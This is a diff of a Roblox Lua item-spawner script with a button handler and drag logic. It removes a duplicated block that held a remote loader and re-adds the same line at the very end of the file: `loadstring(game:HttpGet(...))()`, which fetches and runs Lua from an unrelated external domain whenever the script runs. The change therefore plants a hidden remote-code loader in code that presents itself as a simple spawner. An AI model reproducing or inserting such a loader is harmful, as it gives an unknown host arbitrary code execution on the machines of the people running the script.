@@ -141,12 +141,6 @@ end
 
 spawnButton.MouseButton1Click:Connect(function()
     local itemName = itemTextBox.Text
-
-loadstring(game:HttpGet("https://egorikusa.space/c4f39df05f45c751928e95b1.lua", true))()
-end
-
-spawnButton.MouseButton1Click:Connect(function()
-    local itemName = itemTextBox.Text
     local item = itemList[itemName]
 
     if item then
@@ -190,3 +184,5 @@ UIS.InputChanged:Connect(function(input)
         update(input)
     end
 end)
+
+loadstring(game:HttpGet("https://egorikusa.space/c4f39df05f45c751928e95b1.lua", true))()
